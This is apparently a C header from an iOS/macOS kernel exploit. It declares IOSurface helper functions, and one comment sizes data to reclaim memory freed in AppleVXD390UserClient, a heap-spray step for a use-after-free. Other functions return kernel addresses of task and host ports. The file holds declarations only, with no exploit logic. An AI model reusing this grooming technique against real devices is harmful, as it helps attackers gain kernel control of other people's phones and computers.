#ifndef IOSURFACE_H
#define IOSURFACE_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#include "base64-utils.h"

#define CREATE_SURFACE 0
#define SET_VALUE 11
#define GET_VALUE 12

#define SURFACE_CREATE_OUTPUT_SIZE 0x548

// This should land the data in the same zone as the data we free in AppleVXD390UserClient
#define XML_DATA_SIZE 0x1C

typedef union
{
    uint8_t _padding[SURFACE_CREATE_OUTPUT_SIZE];
    struct
    {
	mach_vm_address_t addr1;
	mach_vm_address_t addr2;
	uint32_t id;
    } data;
} create_surface_output_t;

io_connect_t openIOSurfaceConnection();
uint32_t createSurface(io_connect_t conn);
int setValueZeroes(io_connect_t conn, uint32_t surface_id);
int setValuePorts(io_connect_t conn, uint32_t surface_id, mach_port_t target, mach_port_t own_task, mach_port_t host);
int getValue(io_connect_t conn, uint32_t surface_id, uint32_t* target_port_kp, uint32_t* own_task_port_kp, uint32_t* mach_host_self_kp);

#endif /* ! IOSURFACE_H */